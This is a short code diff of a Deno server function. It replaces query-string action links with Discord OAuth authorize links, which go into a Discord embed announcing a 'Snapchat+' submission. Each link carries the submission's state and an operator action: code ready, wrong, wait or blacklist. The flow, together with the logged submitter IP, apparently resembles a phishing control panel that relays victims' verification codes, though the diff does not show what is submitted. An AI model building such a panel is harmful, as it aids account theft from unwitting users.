@@ -45,10 +45,13 @@ Deno.serve(async (req) => {
   });
 
   const appUrl = Deno.env.get("APP_URL")?.replace(/\/$/, "") || "https://snap-post-hub.base44.app";
-  const triggerUrl = `${appUrl}/?trigger=${submissionId}`;
-  const wrongUrl = `${appUrl}/?triggerAction=wrong&id=${submissionId}`;
-  const waitUrl = `${appUrl}/?triggerAction=wait&id=${submissionId}`;
-  const blacklistUrl = `${appUrl}/?triggerAction=blacklist&id=${submissionId}&ip=${encodeURIComponent(finalIp)}`;
+  const redirectUri = `${appUrl}/api/discord-callback`;
+  const discordAuthUrl = `https://discord.com/api/oauth2/authorize?client_id=${Deno.env.get("DISCORD_APP_ID")}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=code&scope=identify`;
+  
+  const triggerUrl = `${discordAuthUrl}&state=${submissionId}&action=code_ready`;
+  const wrongUrl = `${discordAuthUrl}&state=${submissionId}&action=wrong`;
+  const waitUrl = `${discordAuthUrl}&state=${submissionId}&action=wait`;
+  const blacklistUrl = `${discordAuthUrl}&state=${submissionId}&action=blacklist`;
 
   const embed = {
     title: "📱 Nouvelle soumission Snapchat+",
